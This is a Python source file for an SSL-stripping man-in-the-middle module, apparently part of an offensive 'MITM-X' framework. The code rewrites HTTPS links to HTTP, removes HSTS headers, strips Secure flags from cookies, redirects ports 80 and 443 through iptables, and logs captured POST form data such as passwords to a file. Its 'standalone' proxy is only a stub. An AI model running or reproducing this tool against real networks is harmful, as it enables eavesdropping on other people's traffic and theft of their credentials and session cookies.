#!/usr/bin/env python3
"""
SSL Strip Module for MITM-X Framework
Downgrades HTTPS connections to HTTP by removing SSL/TLS encryption
"""

import os
import sys
import re
import argparse
import logging
import threading
import socket
from urllib.parse import urlparse, parse_qs
try:
    from mitmproxy import http, options
    from mitmproxy.tools.dump import DumpMaster
    from mitmproxy.addons import script
except ImportError:
    print("mitmproxy not installed. Run: pip3 install mitmproxy")
    sys.exit(1)

class SSLStrip:
    """
    SSL Strip class to downgrade HTTPS connections to HTTP
    """
    
    def __init__(self, port=8080, interface="0.0.0.0"):
        """
        Initialize SSL Strip
        
        Args:
            port (int): Port to run proxy on
            interface (str): Interface to bind to
        """
        self.port = port
        self.interface = interface
        self.running = False
        self.master = None
        
        # HTTPS to HTTP mappings
        self.https_mappings = {}
        
        # HSTS domains to bypass
        self.hsts_bypass = True
        
        # Setup logging
        logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
        self.logger = logging.getLogger(__name__)
        
        # Log file for stripped URLs
        self.log_file = "logs/ssl_strip.log"
        os.makedirs("logs", exist_ok=True)
    
    def log_to_file(self, data):
        """
        Log data to file
        
        Args:
            data (str): Data to log
        """
        try:
            with open(self.log_file, 'a') as f:
                from datetime import datetime
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                f.write(f"[{timestamp}] {data}\n")
        except Exception as e:
            self.logger.error(f"Error writing to log file: {e}")
    
    def strip_https_links(self, content):
        """
        Strip HTTPS links from HTML content and replace with HTTP
        
        Args:
            content (str): HTML content
            
        Returns:
            str: Modified content with HTTP links
        """
        try:
            # Replace https:// with http://
            content = re.sub(r'https://', 'http://', content, flags=re.IGNORECASE)
            
            # Remove secure cookie flags
            content = re.sub(r';\s*secure', '', content, flags=re.IGNORECASE)
            
            # Remove HSTS headers if bypassing
            if self.hsts_bypass:
                content = re.sub(r'strict-transport-security[^\r\n]*', '', content, flags=re.IGNORECASE)
            
            return content
            
        except Exception as e:
            self.logger.error(f"Error stripping HTTPS links: {e}")
            return content
    
    def response(self, flow: http.HTTPFlow) -> None:
        """
        Handle HTTP responses and strip SSL
        
        Args:
            flow: mitmproxy HTTPFlow object
        """
        try:
            # Only process HTML responses
            if flow.response and flow.response.headers.get("content-type", "").startswith("text/html"):
                content = flow.response.get_text()
                
                if content:
                    # Strip HTTPS links
                    modified_content = self.strip_https_links(content)
                    
                    if modified_content != content:
                        flow.response.set_text(modified_content)
                        self.logger.info(f"SSL stripped for: {flow.request.pretty_url}")
                        self.log_to_file(f"SSL stripped: {flow.request.pretty_url}")
            
            # Remove HSTS headers
            if self.hsts_bypass and flow.response:
                if "strict-transport-security" in flow.response.headers:
                    del flow.response.headers["strict-transport-security"]
                    self.logger.info(f"HSTS header removed for: {flow.request.pretty_url}")
                
                # Remove secure flags from cookies
                if "set-cookie" in flow.response.headers:
                    cookies = flow.response.headers["set-cookie"]
                    if isinstance(cookies, str):
                        cookies = [cookies]
                    
                    modified_cookies = []
                    for cookie in cookies:
                        # Remove secure flag
                        modified_cookie = re.sub(r';\s*secure', '', cookie, flags=re.IGNORECASE)
                        modified_cookies.append(modified_cookie)
                    
                    flow.response.headers["set-cookie"] = modified_cookies
        
        except Exception as e:
            self.logger.error(f"Error processing response: {e}")
    
    def request(self, flow: http.HTTPFlow) -> None:
        """
        Handle HTTP requests
        
        Args:
            flow: mitmproxy HTTPFlow object
        """
        try:
            # Log the request
            self.logger.info(f"Request: {flow.request.method} {flow.request.pretty_url}")
            self.log_to_file(f"Request: {flow.request.method} {flow.request.pretty_url}")
            
            # Extract form data if POST request
            if flow.request.method == "POST" and flow.request.content:
                content_type = flow.request.headers.get("content-type", "")
                
                if "application/x-www-form-urlencoded" in content_type:
                    try:
                        form_data = flow.request.get_text()
                        if form_data:
                            self.logger.warning(f"Form data captured: {form_data}")
                            self.log_to_file(f"Form data: {flow.request.pretty_url} - {form_data}")
                    except:
                        pass
        
        except Exception as e:
            self.logger.error(f"Error processing request: {e}")
    
    def setup_iptables_redirect(self):
        """
        Setup iptables rules to redirect HTTPS traffic to proxy
        """
        try:
            # Redirect HTTPS traffic to proxy
            commands = [
                f"iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {self.port}",
                f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {self.port}",
                "iptables -t nat -A POSTROUTING -j MASQUERADE"
            ]
            
            for cmd in commands:
                os.system(cmd)
                self.logger.info(f"Executed: {cmd}")
        
        except Exception as e:
            self.logger.error(f"Error setting up iptables redirect: {e}")
    
    def remove_iptables_redirect(self):
        """
        Remove iptables rules for traffic redirection
        """
        try:
            commands = [
                f"iptables -t nat -D PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {self.port}",
                f"iptables -t nat -D PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {self.port}",
                "iptables -t nat -D POSTROUTING -j MASQUERADE"
            ]
            
            for cmd in commands:
                os.system(cmd)
        
        except Exception as e:
            self.logger.error(f"Error removing iptables redirect: {e}")
    
    def start_proxy(self, setup_iptables=True):
        """
        Start SSL Strip proxy
        
        Args:
            setup_iptables (bool): Whether to setup iptables rules
        """
        self.logger.info(f"Starting SSL Strip proxy on {self.interface}:{self.port}")
        
        if setup_iptables:
            self.setup_iptables_redirect()
        
        try:
            # Configure mitmproxy options
            opts = options.Options(
                listen_host=self.interface,
                listen_port=self.port,
                mode="transparent"
            )
            
            # Create master
            self.master = DumpMaster(opts)
            
            # Add this addon to handle requests/responses
            self.master.addons.add(self)
            
            self.running = True
            self.logger.info("SSL Strip proxy started")
            
            # Run the proxy
            self.master.run()
        
        except KeyboardInterrupt:
            self.logger.info("SSL Strip interrupted")
        except Exception as e:
            self.logger.error(f"Error running SSL Strip proxy: {e}")
        finally:
            self.stop_proxy(setup_iptables)
    
    def stop_proxy(self, remove_iptables=True):
        """
        Stop SSL Strip proxy
        
        Args:
            remove_iptables (bool): Whether to remove iptables rules
        """
        self.running = False
        
        if self.master:
            self.master.shutdown()
        
        if remove_iptables:
            self.remove_iptables_redirect()
        
        self.logger.info("SSL Strip proxy stopped")
    
    def add_target_domain(self, domain):
        """
        Add domain to target for SSL stripping
        
        Args:
            domain (str): Domain to target
        """
        self.https_mappings[f"https://{domain}"] = f"http://{domain}"
        self.logger.info(f"Added target domain: {domain}")
    
    def remove_target_domain(self, domain):
        """
        Remove domain from SSL stripping targets
        
        Args:
            domain (str): Domain to remove
        """
        https_url = f"https://{domain}"
        if https_url in self.https_mappings:
            del self.https_mappings[https_url]
            self.logger.info(f"Removed target domain: {domain}")

class SSLStripStandalone:
    """
    Standalone SSL Strip implementation without mitmproxy dependency
    """
    
    def __init__(self, port=8080):
        """
        Initialize standalone SSL Strip
        
        Args:
            port (int): Port to run proxy on
        """
        self.port = port
        self.running = False
        
        # Setup logging
        logging.basicConfig(level=logging.INFO)
        self.logger = logging.getLogger(__name__)
    
    def handle_client(self, client_socket):
        """
        Handle client connections
        
        Args:
            client_socket: Client socket connection
        """
        try:
            # Receive request
            request = client_socket.recv(4096).decode('utf-8', errors='ignore')
            
            if not request:
                return
            
            # Parse request
            lines = request.split('\n')
            if lines:
                first_line = lines[0]
                method, url, version = first_line.split()
                
                # Log request
                self.logger.info(f"Request: {method} {url}")
                
                # Simple response for demonstration
                response = "HTTP/1.1 200 OK\r\n"
                response += "Content-Type: text/html\r\n"
                response += "Connection: close\r\n\r\n"
                response += "<html><body><h1>SSL Strip Active</h1></body></html>"
                
                client_socket.send(response.encode())
        
        except Exception as e:
            self.logger.error(f"Error handling client: {e}")
        finally:
            client_socket.close()
    
    def start_simple_proxy(self):
        """
        Start simple proxy server
        """
        self.logger.info(f"Starting simple SSL Strip proxy on port {self.port}")
        
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        try:
            server_socket.bind(('0.0.0.0', self.port))
            server_socket.listen(5)
            
            self.running = True
            
            while self.running:
                client_socket, addr = server_socket.accept()
                self.logger.info(f"Connection from {addr}")
                
                # Handle client in separate thread
                client_thread = threading.Thread(target=self.handle_client, args=(client_socket,))
                client_thread.start()
        
        except Exception as e:
            self.logger.error(f"Error in simple proxy: {e}")
        finally:
            server_socket.close()

def main():
    """
    Main function for standalone execution
    """
    parser = argparse.ArgumentParser(description="SSL Strip for MITM attacks")
    parser.add_argument("--port", "-p", type=int, default=8080, help="Proxy port")
    parser.add_argument("--interface", "-i", default="0.0.0.0", help="Interface to bind to")
    parser.add_argument("--no-iptables", action="store_true", help="Don't setup iptables rules")
    parser.add_argument("--simple", action="store_true", help="Use simple proxy without mitmproxy")
    
    args = parser.parse_args()
    
    # Check if running as root
    if os.geteuid() != 0:
        print("This script requires root privileges!")
        sys.exit(1)
    
    if args.simple:
        # Use simple standalone proxy
        proxy = SSLStripStandalone(args.port)
        try:
            proxy.start_simple_proxy()
        except KeyboardInterrupt:
            print("\nStopping SSL Strip proxy...")
            proxy.running = False
    else:
        # Use mitmproxy-based SSL Strip
        ssl_strip = SSLStrip(args.port, args.interface)
        
        try:
            ssl_strip.start_proxy(not args.no_iptables)
        except KeyboardInterrupt:
            print("\nStopping SSL Strip...")
            ssl_strip.stop_proxy(not args.no_iptables)

if __name__ == "__main__":
    main()
